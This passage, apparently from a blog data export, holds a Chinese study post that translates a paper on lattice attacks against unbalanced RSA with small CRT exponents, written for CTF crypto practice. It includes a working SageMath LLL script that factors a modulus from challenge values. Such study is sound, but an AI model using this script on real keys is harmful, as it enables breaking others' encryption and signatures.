  c2 = abs(c[1])      # q*dp\n        q = abs((e*c2+c1*N)//(c1+1))\n        p = N//q\n        print('[+] Attack successed')\n        print('[+] p = {}'.format(p))\n        print('[+] q = {}'.format(q))\n        return p, q\n\n\nif __name__ == '__main__':\n    # from random import *\n\n    # qbits = 900\n    # pbits = 3138\n    # dpbits = 66\n\n    # print('[+] Generating parameters...')\n    # p = random_prime(2 ^ pbits)\n    # q = random_prime(2 ^ qbits)\n    # dp = random_prime(2 ^ dpbits)\n\n    # while True:\n    #     d = (p - 1) * (randint(1 << 895, 1 << 905)) + dp\n\n    #     if GCD(d, (p - 1) * (q - 1)) == 1:\n    #         break\n\n    # e = pow(d, -1, (p - 1) * (q - 1))\n    # N = p * q\n    # Nbits = int(N).bit_length()\n    # beta = qbits/Nbits\n    # delta = dpbits/Nbits\n\n    # print('[+] N = {}'.format(N))\n    # print('[+] e = {}'.format(e))\n    # print('[+] beta = {}'.format(beta))\n    # print('[+] delta = {}'.format(delta))\n    N = 634629908805216799355967956917035397016752766546070169887547308032924761760891699780399214796824214567267154390070522978483366198289411019582748412313710079216359358255867558259121819712947017660972562997658767364245468900343296627500215831311492976020519937654664907394551244233281196085084301881491720946011495516095312100438461444736650645875530160635314476776379821792685906378511085849924665878291761636238890281686290340422138558891124650561389417569572198766305774737557276999432569512459279457704718190818264594575715474945778743504600307881900481338218715405869829242732728780155929040869667117191128487515003629576385308251284254186650906711925117856043812344169291478611645877809590138625462171489233257786403238243625811812424843820945935661305236547254826569192218598933115538295435575896652227458056744204696170806637821332028265957534034435423213071725773547809761130059315592010070432661283749890121832768362711638162670468266766356808625866527581349441814512302739394082651200775637526523353517769267014266507198162521714133402947845712189448974860772495360651769766890958881349140536387282266034095164827944286428551415655867359896643466364963634800962833486281066681776967479689689507887525855059\n    e = 222449729494346666756992460607761795081627331408633195158207067801306565329147681510898658030387508242070227143765893175513890166451777866451978064721778354202341750518999213529606354327894502393449664534948211789294499720405305147950904692085956769722064799513485397504251091294784655828560748848569365844048162038115977508383792426755701835564072424447439243657439872604411430842404037279822672689499520052597008624952368711035998877339177834448061486065262519442303882787242038252503252910254536179033495248788991658972894666551977962064604651051056420818328840034050064445699641044377207422145434076180424757570241966515333860523020888095363402812210233331161015473008660090443148983742164413532587125663777942637230471840611787651285227528953723973668762432241634488008559578459289516131455221246160389933755148774233018937472092674461794244671504900737970090655485320247064558891268178725955788668940079001559604584196657982775865643371046971752485475409807795707098733502124948500727883742572495725371711913411783312068234668792482799143907403909681456144274826087394298716593721198894233809352032011315411881752188433540351647062223660868815946885574427181940281003433351179379410815810916817304563532735699\n    beta = 225/1009\n    delta = 33/2018\n    attack(N, e, beta, delta)\n```\n","slug":"小 CRT 指数非平衡 RSA 的密码分析论文分析","published":1,"updated":"2024-06-05T07:53:00.259Z","_id":"clazajjr5000oyo6ghsdsefz1","comments":1,"layout":"post","photos":[],"content":"<p>直接读头晕，翻译更看不懂，就写篇文一点点细啃吧。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>第一次认真看英文论文，也是第一次看论文。<br>这篇是 NSSCTF 中 Crypto 题的出题论文，题目非常简单，但是零解（）<br>后来在 Destog3 迎新赛的压轴题又看到了几乎一样的题，照着 NSSCTF 的 wp 改了下参数中跑出来了，既然在短时间内能碰见两次，也是缘分，就读读罢。</p>\n<h2 id=\"论文翻译\"><a href=\"#论文翻译\" class=\"headerlink\" title=\"论文翻译\"></a>论文翻译</h2><h3 id=\"引言\"><a href=\"#引言\" class=\"headerlink\" title=\"引言\"></a>引言</h3><p>论文中写到 $ed=1\\mod\\frac{(p-1)(q-1)}{2}$ （这个我没见过），然后 $ \\gcd(p-1,\\frac{q-1}{2})=1$ ，再然后由CRT给出 $ed=1\\mod p-1$ 且 $ed=1\\mod\\frac{q-1}{2}$ 。<br>为了加速 RSA 的解密，有人想用小解密指数 $d$ ，然而 Wiener 先生指出 $d&lt; \\frac{1}{3}N^{\\frac{1}{4}}$ 时可以在多项式时间内爆破出来。<br>虽然不能使用小解密指数 $d$ ，但还有一个方法，就是计算 $d_p=d\\mod p-1$ 和 $d_q=d\\mod \\frac{q-1}{2}$ 是比较小的，这样一个 $d$ 称为<strong>小CRT指数</strong>。为了对消息 $m$ 进行签名，可以计算 $m^{d_p}\\mod p$ 和 $m^{d_q}\\mod q$ ，在之前，由于 $d$ 看起来是比较大的，所以也没法攻击（意思应该就是现在可以了）。<br>攻破这个系统的最优的算法的时间复杂度在 $O(\\min(\\sqrt{d_p},\\sqrt{d_q}))$ ，同时有趣的是， $p$ 和 $q$ 不平衡时往往会降低 RSA 的安全性。<br>令 $q &lt; N^\\beta$ 且 $d_p \\le N^\\delta$ ，当满足 $3\\beta + 2\\delta \\le 1 - \\log_N(4)$ 时可以在 $O(\\log^2(N))$ 复杂度内分解 $N$ ，显然，这个方法只能在 $\\beta &lt; \\frac{1}{3}$ 时有效。<br><strong>关键部分来了</strong>，这里说到，文章中给出了一种构造任意维度的格的方法来将条件提升到 $3\\beta - \\beta^2 + 2\\delta \\le 1 - \\epsilon$ ，这个 $\\epsilon$ 是一个小错误的意思（我也不知道干嘛的）。因此只要 $\\beta &lt; \\frac{3-\\sqrt{5}}{2}=\\hat{\\phi}^2$ ，这个方法就是有效的，当 $\\hat{\\phi}$ 时是黄金比例的共轭（这一段我又不知道在干嘛了）。</p>\n<h3 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h3><p>记模 $N$ 环为 $\\mathbb {Z}_N$ ，整数模 $N$ 乘法群为 $\\mathbb{Z}^*_N$</p>\n<blockquote>\n<p><strong>真相1</strong>（原文就叫Fact 1，随便翻译意思一下）<br>$(Lenstra, Lenstra and Lov´asz)$<br>令 $L$ 为一个由 ${v_1,…,v_n}$ 张成的格，那么 $L^3-reduction$ 算法可以在多项式时间内输出一个以 ${v_1^\\prime,…,v_n^\\prime}$ 为基的格且这组基满足<br>$$<br>    |v_1^\\prime| \\le 2^{\\frac{n-1}{4}} \\ det(L)^\\frac{1}{n} \\ and \\ |v_2^\\prime| \\le 2^{\\frac{n}{2}} \\ det(L)^\\frac{1}{n-1}<br>$$</p>\n</blockquote>\n<h4 id=\"用-CRT-生成-Key\"><a href=\"#用-CRT-生成-Key\" class=\"headerlink\" title=\"用 CRT 生成 Key\"></a>用 CRT 生成 Key</h4><h3 id=\"一个模-p-的方法\"><a href=\"#一个模-p-的方法\" class=\"headerlink\" title=\"一个模 $p$ 的方法\"></a>一个模 $p$ 的方法</h3><p>同余式改写等式过程如下：<br>$$<br>    ed_p=1 \\mod p-1 \\\\<br>    ed_p+k(p-1)=1 \\ over \\ \\mathbb{Z} \\\\<br>    ed_p-(k+1)=-kp<br>$$<br>下面假设 $q$ 不整除 $k$ ，否则右式是 $N$ 的倍数然后我们可以获得更强的结果（又是奇怪的翻译），等下再讨论这个。<br>此时有多项式<br>$$<br>    f_p(x,y)=ex-y<br>$$<br>且该多项式有一根 $(x_0,y_0)=(d_p,k+1) \\ modulo \\ p$<br>构造时我们有 $d_p \\le N^\\delta$ ，又 $e &lt; \\frac{(p-1)(q-1)}{2}$ ，就有<br>$$<br>    \\lvert k+1\\rvert=\\lvert \\frac{ed_p-2}{p-1}\\rvert &lt; \\frac{ed_p}{p-1} &lt; \\frac{q-1}{2}d_p &lt; N^{\\beta + \\delta}<br>$$<br>定义两个上界 $X=N^\\delta$ 和 $Y=N^{\\beta + \\delta}$ ，则模二元多项式方程 $f_p$ 有一个小根 $(x_0),y_0$ 满足 $\\lvert x_0 \\rvert \\le X$ 且 $\\lvert y_0 \\rvert \\le Y$ ，这个模方程可以用 Howgrave_Grahm 定理转变为一个整数上的方程。</p>\n<blockquote>\n<p><strong>真相2 $(Howgrave-Graham)$</strong><br>令 $f(x,y)$ 为一个至多 $\\omega$ 个单项式的和的多项式，假定 $f(x_0,y_0)=0\\mod \\ p^m$ ( $m$ 为正整数)， $\\lvert x_0 \\rvert \\le X$ 且 $\\lvert y_0 \\rvert \\le Y$ 。若 $|f(xX,yY)| &lt; \\frac{p^m}{\\sqrt{\\omega}}$ ，则 $f(x_0,y_0)=0$ 在整数上成立。</p>\n</blockquote>\n<p>用格约化算法可以找到一个小欧里几得范数的多项式 $f(xX,yY)$ ，第一个方法是构造一个二维的格，这时高斯约化算法可以找到一个最短向量。<br>我们选择 $m=1$ ，然后我们使用同样含根 $x_0 \\ modulo \\ p$ 的辅助多项式 $f_0(x)=Nx$ ，因为 $N$ 是 $p$ 的倍数。<br>因此， $f_0$ 和 $f_p$ 的每个整数线性组合都有根 $(x_0,y_0) \\ modulo \\ p$ 。<br>此时构造一个由多项式 $f_0(xX)$ 和 $f_p(xX,yY)$ 的系数向量张成的格 $L_p$ 。这些系数向量是如下 $(2x2)$ 格基矩阵 $B_p$ 的行向量<br>$$<br>B_p=<br>\\begin{bmatrix}<br>    NX \\\\<br>    eX &amp; -Y<br>\\end{bmatrix}<br>$$<br>然后找到一个向量 $v$ 使其欧里几得范数小于 $\\frac{p}{\\sqrt{2}}$ ，这个向量可以被转换成一个满足<strong>真相2</strong>的多项式 $f(x,y)$ 。</p>\n<blockquote>\n<p><strong>引理3</strong> 令 $X=N^\\delta$ 和 $Y=N^{\\beta + \\delta}$ 满足<br>$$<br>    3\\beta + 2\\delta \\le 1 - log_N(4)<br>$$<br>则 $L_p$ 有一个最小向量 $v$ 满足 $|v|&lt;\\frac{p}{\\sqrt{2}}$<br><strong>证明</strong> 由 Minkowski 定理，…呃先不说这个，能用就行（逃</p>\n</blockquote>\n<p>通过<strong>引理3</strong>，我们知道，对每个固定的 $\\epsilon &gt; 0$ ，条件 $3\\beta + 2\\delta \\le 1 - \\epsilon$ 有适当的模量 $N$ （这里我感觉不应该是这么翻译，后面再改）。<br>假定我们通过格约化找到了一个 $L_p$ 中的向量 $v$ ，其范数小于 $\\frac{p}{\\sqrt{2}}$ ，令 $v$ 为多项式 $f(xX,yY)$ 的系数向量，应用<strong>真相2</strong>，我们知道 $f(x,y)$ 在整数上有一根 $(x_0,y_0)=(d_p,k+1)$ ，下一个定理将表明这个根可以很容易被找到。</p>\n<blockquote>\n<p><strong>引理4</strong> 令 $v=(c_0,c_1)\\cdot B_p$ 为 $L_p$ 的最短向量且满足 $|v|&lt;\\frac{p}{\\sqrt{2}}$ 则 $\\lvert c_0 \\rvert = k$ 且 $\\lvert c_1 \\rvert = qd_p$<br><strong>证明</strong> 略</p>\n</blockquote>\n<p>总结如下结论就有如下定理：</p>\n<blockquote>\n<p><strong>定理5</strong> 给定一个 RSA 公钥对 $(N,e)$ ，令 $q&lt;N^\\beta,d_p \\le N^\\delta$ 且<br>$$<br>    3\\beta + 2\\delta \\le 1 - log_N(4)<br>$$<br>则 $N$ 可以在时间 $O(log^2(N))$ 内被分解。<br><strong>证明</strong> 还是略（</p>\n</blockquote>\n<p>在之前的分析中，我们假设 $q$ 不整除 $k$ ，特殊情况下若 $k=qr$ ( $r \\in \\mathbb{Z}$ )，我们得到了类似于以下更强结果之前的推理（百度翻译的）</p>\n<blockquote>\n<p><strong>定理6</strong> 给定一个RSA公钥对$(N,e)$，令$q&lt;N^\\beta,d_p \\le N^\\delta$且<br>$$<br>    k=qr \\ and \\ 3\\beta + 2\\delta \\le 1 - log_N(4)<br>$$<br>则 $N$ 可以在时间 $O(log^2(N))$ 内被分解。<br><strong>证明</strong> 又双叒叕是略（</p>\n</blockquote>\n<p>有趣的是，在定理 6 中选择 $\\beta=\\frac{1}{2}$ 会有一个界 $\\delta \\le \\frac{1}{4}-log_N(4)$ ，这与 Wiener 的界差不多。</p>\n<h3 id=\"将界提升到-beta-lt-N-0-382\"><a href=\"#将界提升到-beta-lt-N-0-382\" class=\"headerlink\" title=\"将界提升到 $\\beta &lt; N^{0.382}$\"></a>将界提升到 $\\beta &lt; N^{0.382}$</h3><p>这里将界提升到 $\\beta &lt; \\frac{3-\\sqrt{5}}{2} \\approx N^{0.382}$ 。<br>上面我们使用<strong>真相2</strong>的时候选择 $m=1$ ，现在一般化方法到任意 $m$ 。<br>定义 $x$ 移位多项式（这个也是百度翻译）<br>$$<br>    g_{m,i,j}(x,y)=N^{max(0,m-j)}x^if^j_p(x,y)<br>$$<br>注意到，每个多项式 $g_{m,i,j}$ 的线性组合都有零点 $(x_0,y_0)=(d_p,k+1)\\ modulo \\ p^m$ 。<br>确定一个格维数 $n$ ，然后用 $g_{m,i,j}(xX,yY)$ 的系数向量来构造一个 $n$ 维格 $L_p$ ，其中 $j=0…n-1$ ， $i=n-j-i$ 。参数 $m$ 是 $n$ 的函数且须进行优化。<br>比如选取 $n=4$ ， $m=2$ ，格 $L_p$ 由如下行向量张成<br>$$<br>B_p=<br>\\begin{bmatrix}<br>    N^2X^3 \\\\<br>    eNX^3 &amp; -NX^2Y \\\\<br>    e^2X^3 &amp; -2eX^2Y &amp; XY^2 \\\\<br>    e^3X^3 &amp; -3e^2X^2Y &amp; 3eXY^2 &amp; -Y^3<br>\\end{bmatrix}<br>$$<br>注意到，之前的 $L_p$ 和这里的 $L_p(2)$ 是一样的。<br>为了满足<strong>真相2</strong>，我们一个满足范数小于 $\\frac{p^m}{\\sqrt{n}}$ 系数向量 $v$ ，如下引理给出了一个找这样一个向量的条件</p>\n<blockquote>\n<p><strong>引理7</strong> 对每个确定的 $\\epsilon&gt;0$ ，令 $X=\\frac{n+1}{2}N^\\delta$ ， $Y=\\frac{n+1}{2}N^{\\beta+\\delta}$ 满足<br>$$<br>    3\\beta - \\beta^2 + 2\\delta \\le 1 - \\epsilon<br>$$<br>然后用 LLL 算法可以在 $L_p(n)$ 中找到一个向量 $v$ 满足范数小于 $\\frac{p^m}{\\sqrt{n}}$ 。<br><strong>证明</strong> 略（</p>\n</blockquote>\n<p>现在我们可以用上面的<strong>引理7</strong>与<strong>真相2</strong>结合来构造一个次数为$n$的双变量多项式 $f(x,y)$ ，该多项式最多由 $n$ 个单项式组成，有一根 $(x_0,y_0)$ ，现在问题来到如何提取根 $(x_0,y_0)$ 。<br>与<strong>引理4</strong>类似，等下写这</p>\n<blockquote>\n<p><strong>引理8</strong> 令 $X=\\frac{n+1}{2}N^\\delta$ ， $Y=\\frac{n+1}{2}N^{\\beta+\\delta}$ ，多项式 $f_p(x,y)=ex-y$ 有一根 $(x_0,y_0)\\ modulo \\ p$ 满足 $\\lvert x_0 \\rvert \\le N^\\delta$ ， $\\lvert y_0 \\rvert \\le N^{\\beta +\\delta}$ ，令 $v$ 为 $L_p(n)$ 中范数小于 $\\frac{p^m}{\\sqrt{n}}$ 的向量（ $v$ 为项式 $f(xX,yY)$ 的系数向量），然后多项式 $p(x,y)=y_0x-x_0y \\in \\mathbb{Z}$ 一定整除 $f(x,y)$ ，我们就可以通过在 $\\mathbb{Z}[x,y]$ 上分解 $f$ 找到 $p$ 。<br><strong>证明</strong> 略（</p>\n</blockquote>\n<p>总结这些结论，就有如下定理：</p>\n<blockquote>\n<p><strong>定理9</strong> 给定一个 RSA 公钥对 $(N,e)$ ，令 $q &lt; N^\\beta,d_p \\le N^\\delta$<br>且<br>$$<br>    3\\beta - \\beta^2 + 2\\delta \\le 1 - \\epsilon<br>$$<br>其中对于适当大的 $N$ （啥叫适当大）， $\\epsilon&gt;0$ 任意小，则我们可以在 $log(N)$ 确定的时间多项式内分解 $N$ 。<br><strong>证明</strong> 略（</p>\n</blockquote>\n<h3 id=\"一个模-e-的方法\"><a href=\"#一个模-e-的方法\" class=\"headerlink\" title=\"一个模 $e$ 的方法\"></a>一个模 $e$ 的方法</h3><p>好像没啥用？？？不写了</p>\n<h3 id=\"方法间的比较\"><a href=\"#方法间的比较\" class=\"headerlink\" title=\"方法间的比较\"></a>方法间的比较</h3><p>懒得写了（逃</p>\n<h2 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h2><h3 id=\"Section3\"><a href=\"#Section3\" class=\"headerlink\" title=\"Section3\"></a>Section3</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!sage</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">attack</span>(<span class=\"params\">N, e, beta, delta</span>):</span><br><span class=\"line\">    N = <span class=\"built_in\">int</span>(N)</span><br><span class=\"line\">    e = <span class=\"built_in\">int</span>(e)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"number\">3</span>*beta+<span class=\"number\">2</span>*delta &gt; <span class=\"number\">1</span>-log(<span class=\"number\">4</span>, N):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[-] Attack failed&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        X = <span class=\"built_in\">int</span>(<span class=\"built_in\">pow</span>(N, delta))</span><br><span class=\"line\">        Y = <span class=\"built_in\">int</span>(<span class=\"built_in\">pow</span>(N, (beta+delta)))</span><br><span class=\"line\">        Bp = matrix(ZZ, [[N*X, <span class=\"number\">0</span>], [e*X, -Y]])</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] LLL reduction...&#x27;</span>)</span><br><span class=\"line\">        sv = Bp.LLL()[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        c = sv*Bp ^ -<span class=\"number\">1</span></span><br><span class=\"line\">        c1 = -<span class=\"built_in\">abs</span>(c[<span class=\"number\">0</span>])     <span class=\"comment\"># k</span></span><br><span class=\"line\">        c2 = <span class=\"built_in\">abs</span>(c[<span class=\"number\">1</span>])      <span class=\"comment\"># q*dp</span></span><br><span class=\"line\">        q = <span class=\"built_in\">abs</span>((e*c2+c1*N)//(c1+<span class=\"number\">1</span>))</span><br><span class=\"line\">        p = N//q</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] Attack successed&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] p = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(p))</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] q = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(q))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p, q</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># from random import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># qbits = 900</span></span><br><span class=\"line\">    <span class=\"comment\"># pbits = 3138</span></span><br><span class=\"line\">    <span class=\"comment\"># dpbits = 66</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># print(&#x27;[+] Generating parameters...&#x27;)</span></span><br><span class=\"line\">    <span class=\"comment\"># p = random_prime(2 ^ pbits)</span></span><br><span class=\"line\">    <span class=\"comment\"># q = random_prime(2 ^ qbits)</span></span><br><span class=\"line\">    <span class=\"comment\"># dp = random_prime(2 ^ dpbits)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># while True:</span></span><br><span class=\"line\">    <span class=\"comment\">#     d = (p - 1) * (randint(1 &lt;&lt; 895, 1 &lt;&lt; 905)) + dp</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#     if GCD(d, (p - 1) * (q - 1)) == 1:</span></span><br><span class=\"line\">    <span class=\"comment\">#         break</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># e = pow(d, -1, (p - 1) * (q - 1))</span></span><br><span class=\"line\">    <span class=\"comment\"># N = p * q</span></span><br><span class=\"line\">    <span class=\"comment\"># Nbits = int(N).bit_length()</span></span><br><span class=\"line\">    <span class=\"comment\"># beta = qbits/Nbits</span></span><br><span class=\"line\">    <span class=\"comment\"># delta = dpbits/Nbits</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># print(&#x27;[+] N = &#123;&#125;&#x27;.format(N))</span></span><br><span class=\"line\">    <span class=\"comment\"># print(&#x27;[+] e = &#123;&#125;&#x27;.format(e))</span></span><br><span class=\"line\">    <span class=\"comment\"># print(&#x27;[+] beta = &#123;&#125;&#x27;.format(beta))</span></span><br><span class=\"line\">    <span class=\"comment\"># print(&#x27;[+] delta = &#123;&#125;&#x27;.format(delta))</span></span><br><span class=\"line\">    N = <span class=\"number\">634629908805216799355967956917035397016752766546070169887547308032924761760891699780399214796824214567267154390070522978483366198289411019582748412313710079216359358255867558259121819712947017660972562997658767364245468900343296627500215831311492976020519937654664907394551244233281196085084301881491720946011495516095312100438461444736650645875530160635314476776379821792685906378511085849924665878291761636238890281686290340422138558891124650561389417569572198766305774737557276999432569512459279457704718190818264594575715474945778743504600307881900481338218715405869829242732728780155929040869667117191128487515003629576385308251284254186650906711925117856043812344169291478611645877809590138625462171489233257786403238243625811812424843820945935661305236547254826569192218598933115538295435575896652227458056744204696170806637821332028265957534034435423213071725773547809761130059315592010070432661283749890121832768362711638162670468266766356808625866527581349441814512302739394082651200775637526523353517769267014266507198162521714133402947845712189448974860772495360651769766890958881349140536387282266034095164827944286428551415655867359896643466364963634800962833486281066681776967479689689507887525855059</span></span><br><span class=\"line\">    e = <span class=\"number\">222449729494346666756992460607761795081627331408633195158207067801306565329147681510898658030387508242070227143765893175513890166451777866451978064721778354202341750518999213529606354327894502393449664534948211789294499720405305147950904692085956769722064799513485397504251091294784655828560748848569365844048162038115977508383792426755701835564072424447439243657439872604411430842404037279822672689499520052597008624952368711035998877339177834448061486065262519442303882787242038252503252910254536179033495248788991658972894666551977962064604651051056420818328840034050064445699641044377207422145434076180424757570241966515333860523020888095363402812210233331161015473008660090443148983742164413532587125663777942637230471840611787651285227528953723973668762432241634488008559578459289516131455221246160389933755148774233018937472092674461794244671504900737970090655485320247064558891268178725955788668940079001559604584196657982775865643371046971752485475409807795707098733502124948500727883742572495725371711913411783312068234668792482799143907403909681456144274826087394298716593721198894233809352032011315411881752188433540351647062223660868815946885574427181940281003433351179379410815810916817304563532735699</span></span><br><span class=\"line\">    beta = <span class=\"number\">225</span>/<span class=\"number\">1009</span></span><br><span class=\"line\">    delta = <span class=\"number\">33</span>/<span class=\"number\">2018</span></span><br><span class=\"line\">    attack(N, e, beta, delta)</span><br></pre></td></tr></table></figure>\n","excerpt":"<p>直接读头晕，翻译更看不懂，就写篇文一点点细啃吧。</p>","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>第一次认真看英文论文，也是第一次看论文。<br>这篇是 NSSCTF 中 Crypto 题的出题论文，题目非常简单，但是零解（）<br>后来在 Destog3 迎新赛的压轴题又看到了几乎一样的题，照着 NSSCTF 的 wp 改了下参数中跑出来了，既然在短时间内能碰见两次，也是缘分，就读读罢。</p>\n<h2 id=\"论文翻译\"><a href=\"#论文翻译\" class=\"headerlink\" title=\"论文翻译\"></a>论文翻译</h2><h3 id=\"引言\"><a href=\"#引言\" class=\"headerlink\" title=\"引言\"></a>引言</h3><p>论文中写到 $ed=1\\mod\\frac{(p-1)(q-1)}{2}$ （这个我没见过），然后 $ \\gcd(p-1,\\frac{q-1}{2})=1$ ，再然后由CRT给出 $ed=1\\mod p-1$ 且 $ed=1\\mod\\frac{q-1}{2}$ 。<br>为了加速 RSA 的解密，有人想用小解密指数 $d$ ，然而 Wiener 先生指出 $d&lt; \\frac{1}{3}N^{\\frac{1}{4}}$ 时可以在多项式时间内爆破出来。<br>虽然不能使用小解密指数 $d$ ，但还有一个方法，就是计算 $d_p=d\\mod p-1$ 和 $d_q=d\\mod \\frac{q-1}{2}$ 是比较小的，这样一个 $d$ 称为<strong>小CRT指数</strong>。为了对消息 $m$ 进行签名，可以计算 $m^{d_p}\\mod p$ 和 $m^{d_q}\\mod q$ ，在之前，由于 $d$ 看起来是比较大的，所以也没法攻击（意思应该就是现在可以了）。<br>攻破这个系统的最优的算法的时间复杂度在 $O(\\min(\\sqrt{d_p},\\sqrt{d_q}))$ ，同时有趣的是， $p$ 和 $q$ 不平衡时往往会降低 RSA 的安全性。<br>令 $q &lt; N^\\beta$ 且 $d_p \\le N^\\delta$ ，当满足 $3\\beta + 2\\delta \\le 1 - \\log_N(4)$ 时可以在 $O(\\log^2(N))$ 复杂度内分解 $N$ ，显然，这个方法只能在 $\\beta &lt; \\frac{1}{3}$ 时有效。<br><strong>关键部分来了</strong>，这里说到，文章中给出了一种构造任意维度的格的方法来将条件提升到 $3\\beta - \\beta^2 + 2\\delta \\le 1 - \\epsilon$ ，这个 $\\epsilon$ 是一个小错误的意思（我也不知道干嘛的）。因此只要 $\\beta &lt; \\frac{3-\\sqrt{5}}{2}=\\hat{\\phi}^2$ ，这个方法就是有效的，当 $\\hat{\\phi}$ 时是黄金比例的共轭（这一段我又不知道在干嘛了）。</p>\n<h3 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h3><p>记模 $N$ 环为 $\\mathbb {Z}_N$ ，整数模 $N$ 乘法群为 $\\mathbb{Z}^*_N$</p>\n<blockquote>\n<p><strong>真相1</strong>（原文就叫Fact 1，随便翻译意思一下）<br>$(Lenstra, Lenstra and Lov´asz)$<br>令 $L$ 为一个由 ${v_1,…,v_n}$ 张成的格，那么 $L^3-reduction$ 算法可以在多项式时间内输出一个以 ${v_1^\\prime,…,v_n^\\prime}$ 为基的格且这组基满足<br>$$<br>    |v_1^\\prime| \\le 2^{\\frac{n-1}{4}} \\ det(L)^\\frac{1}{n} \\ and \\ |v_2^\\prime| \\le 2^{\\frac{n}{2}} \\ det(L)^\\frac{1}{n-1}<br>$$</p>\n</blockquote>\n<h4 id=\"用-CRT-生成-Key\"><a href=\"#用-CRT-生成-Key\" class=\"headerlink\" title=\"用 CRT 生成 Key\"></a>用 CRT 生成 Key</h4><h3 id=\"一个模-p-的方法\"><a href=\"#一个模-p-的方法\" class=\"headerlink\" title=\"一个模 $p$ 的方法\"></a>一个模 $p$ 的方法</h3><p>同余式改写等式过程如下：<br>$$<br>    ed_p=1 \\mod p-1 \\\\<br>    ed_p+k(p-1)=1 \\ over \\ \\mathbb{Z} \\\\<br>    ed_p-(k+1)=-kp<br>$$<br>下面假设 $q$ 不整除 $k$ ，否则右式是 $N$ 的倍数然后我们可以获得更强的结果（又是奇怪的翻译），等下再讨论这个。<br>此时有多项式<br>$$<br>    f_p(x,y)=ex-y<br>$$<br>且该多项式有一根 $(x_0,y_0)=(d_p,k+1) \\ modulo \\ p$<br>构造时我们有 $d_p \\le N^\\delta$ ，又 $e &lt; \\frac{(p-1)(q-1)}{2}$ ，就有<br>$$<br>    \\lvert k+1\\rvert=\\lvert \\frac{ed_p-2}{p-1}\\rvert &lt; \\frac{ed_p}{p-1} &lt; \\frac{q-1}{2}d_p &lt; N^{\\beta + \\delta}<br>$$<br>定义两个上界 $X=N^\\delta$ 和 $Y=N^{\\beta + \\delta}$ ，则模二元多项式方程 $f_p$ 有一个小根 $(x_0),y_0$ 满足 $\\lvert x_0 \\rvert \\le X$ 且 $\\lvert y_0 \\rvert \\le Y$ ，这个模方程可以用 Howgrave_Grahm 定理转变为一个整数上的方程。</p>\n<blockquote>\n<p><strong>真相2 $(Howgrave-Graham)$</strong><br>令 $f(x,y)$ 为一个至多 $\\omega$ 个单项式的和的多项式，假定 $f(x_0,y_0)=0\\mod \\ p^m$ ( $m$ 为正整数)， $\\lvert x_0 \\rvert \\le X$ 且 $\\lvert y_0 \\rvert \\le Y$ 。若 $|f(xX,yY)| &lt; \\frac{p^m}{\\sqrt{\\omega}}$ ，则 $f(x_0,y_0)=0$ 